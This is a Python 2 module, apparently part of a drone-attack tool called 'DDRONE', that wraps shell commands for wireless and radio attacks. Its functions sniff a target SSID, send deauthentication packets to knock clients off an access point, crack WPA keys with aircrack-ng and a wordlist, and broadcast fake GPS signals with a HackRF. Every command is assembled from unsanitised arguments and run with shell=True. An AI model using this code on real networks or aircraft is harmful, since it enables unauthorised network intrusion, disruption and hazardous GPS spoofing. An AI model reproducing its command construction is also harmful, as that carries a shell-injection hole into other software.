import subprocess
import time
import os


def scandevs():
    """scans for available wireless devices"""
    
    command = ['iwconfig']
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    out, err = p.communicate()
    
    return out


def getmymacs():
    """check all the mac addresses associated with this machine"""
    
    command = 'ifconfig | grep ether'
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    out, err = p.communicate()
    
    return out


def startmon(device):
    """device should already be in monitor mode, but this command will start monitor mode"""
    
    command = ['airmon-ng', 'start', device]
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    out, err = p.communicate()
    
    return out


def searchssid(device, ssid, after=None):
    """search for existence of SSID with device"""
    
    command = 'iw ' + device + ' scan | grep ' + ssid
    
    if after:
        command += ' -A ' + str(after)
    
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    out, err = p.communicate()
    
    return out


def sniffssid(device, ssid, channel, dumpfilename='output'):
    """start sniffing packets of SSID with device"""
    
    # changed --essid to -s for running on the Pi
    command = 'xterm -hold -e "airodump-ng --channel ' + channel + ' -s ' + ssid + ' --write ' + dumpfilename + ' ' + device + '" &'
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    
    return 0


def deauth(device, accesspoint_mac, client_mac, packets=2):
    """send deauthentication packets to client and access point with device"""
    
    command = 'aireplay-ng -0 ' + str(packets) + ' -a ' + accesspoint_mac + ' -c ' + client_mac + ' ' + device
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    out, err = p.communicate()
    
    return out


def cleanfiles(filename, wildcard=False):
    """remove all files from working directory with given file name"""
    
    if filename and len(filename.strip()) > 0:

        command = 'rm ' + os.getcwd() + '/' + filename
        print command

        if wildcard:
            command += '*'

        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        out, err = p.communicate()

        return out


def disabledevice(device):
    """disables device to placed into monitor mode"""
    
    command = 'ifconfig ' + device + ' down'
    subprocess.Popen(command, shell=True)
    
    return 0


def enabledevice(device):
    """enables device to placed into monitor mode"""
    
    command = 'ifconfig ' + device + ' up'
    subprocess.Popen(command, shell=True)
    
    return 0


def crackpsk(mac, capturefilename, wordlist='../res/wordlists/short.txt'):
    
    command = 'aircrack-ng -w ' + wordlist + ' -b ' + mac + ' ' + capturefilename + '*.cap'
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    out, err = p.communicate()
    
    return out


def hackrftransfer(simfile='../res/gps/gpssim.bin'):
    
    out = None
    try:
        command = 'hackrf_transfer -f 1575420000 -p 1 -s 2600000 -a 1 -x 15 -R -t ' + simfile
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
        out, err = p.communicate()
    except KeyboardInterrupt as e:
        print 'DDRONE: Exited and returned to ddrone successfully'
    
    return out


def airmoncheckkill():
    """checks for an kills processes that may interfere with monitor mode"""
    
    command = 'airmon-ng check kill'
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    out, err = p.communicate()
    
    return out


def startmonitormode(device, channel=None):
    """starts device in monitor mode"""
    
    command = 'airmon-ng start ' + device
    
    if channel:
        command += ' ' + str(channel)
        
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    out, err = p.communicate()
    time.sleep(2)
    
    return out


def stopmonitormode(device):
    """stops device in monitor mode"""
    
    command = 'airmon-ng stop ' + device
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    out, err = p.communicate()
    
    return out
    

def startnetworkmanager():
    """starts the network manager service"""
    
    command = 'service network-manager start'
    p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
    
    return 0
